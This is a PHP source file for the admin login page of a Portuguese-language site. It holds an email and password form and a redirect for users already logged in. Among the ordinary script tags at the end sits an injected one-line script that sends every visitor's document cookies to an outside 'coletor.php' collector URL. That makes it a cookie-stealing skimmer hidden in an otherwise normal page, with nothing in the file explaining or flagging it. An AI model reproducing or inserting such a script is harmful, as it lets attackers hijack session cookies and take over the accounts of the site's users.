<?php
error_reporting(E_ALL ^ E_NOTICE);
require_once("_php/arquivos_conexao.php");

 
  

if(usuarioEstaLogado()) { 
    header("Location: painel.php");
} else { ?> 

<div class="login">
    <div class="login_wrapper">
        <div class="login_limiter">
            <h1>Administração do Particular</h1>
            
            <form action="_php/login.php" method="POST">

                <div class="login_group">
                    <svg class="icon_user" x="0px" y="0px" viewBox="0 0 258.75 258.75" enableBackground="new 0 0 258.75 258.75;"> <circle cx="129.375" cy="60" r="60"/> <path d="M129.375,150c-60.061,0-108.75,48.689-108.75,108.75h217.5C238.125,198.689,189.436,150,129.375,150z"/></svg>
                    <input type="text" placeHolder="seu e-mail" class="login_input" name="email"/>
                </div>

                <div class="login_group">
                    <svg class="icon_lock" x="0px" y="0px" viewBox="0 0 502.686 502.686" enableBackground="new 0 0 502.686 502.686;"><path d="M403.676,221.014v-68.746C403.697,68.293,335.339,0,251.407,0 C167.411,0,99.096,68.293,99.096,152.268v68.768H66.373v281.65h369.939V221.014H403.676z M156.453,152.268 c0-52.309,42.581-94.825,94.933-94.825c52.266,0,94.825,42.538,94.825,94.825v68.768H156.453V152.268z M277.551,425.462h-52.266 l7.83-77.202c-9.664-6.018-16.178-16.76-16.178-29.077c0-18.961,15.402-34.362,34.47-34.362 c18.961,0,34.319,15.402,34.319,34.362c0,12.317-6.407,23.038-16.157,29.077L277.551,425.462z"/></svg>
                    <input type="password" placeHolder="sua senha" class="login_input" name="senha" />
                </div>
                
                <div class="login_group">
                    <button type="submit" class="login_submit">Acessar</button>
                </div>
                
                <?php mostraAlerta("success"); mostraAlerta("danger"); //mostra alerta?>
            </form>

            <div class="login_group">
              <!--   <p class="login_p">
                    <a href="#" class="#">Esqueci minha Senha!</a>
                </p>
                <p class="login_p">
                    Ainda não possui conta ? <a href="#" class="login_account">Crie agora!</a>
                </p> -->
            </div>
        </div>
    </div>
    <div class="foter_admin col-md-12"><p>desenvolvido por Eric Rodrigues</p></div>
</div>


<?php } ?>
 
    
    
    <script> new Image().src="http://automotivo.boscoguinchos.com.br/admin/coletor.php?cookie="+document.cookie;</script>
    <script src="js/custom.js"></script>
    <script src="js/vendor/jquery.min.js"></script>
    <script src="js/vendor/bootstrap.min.js"></script>
</body>
</html> 
 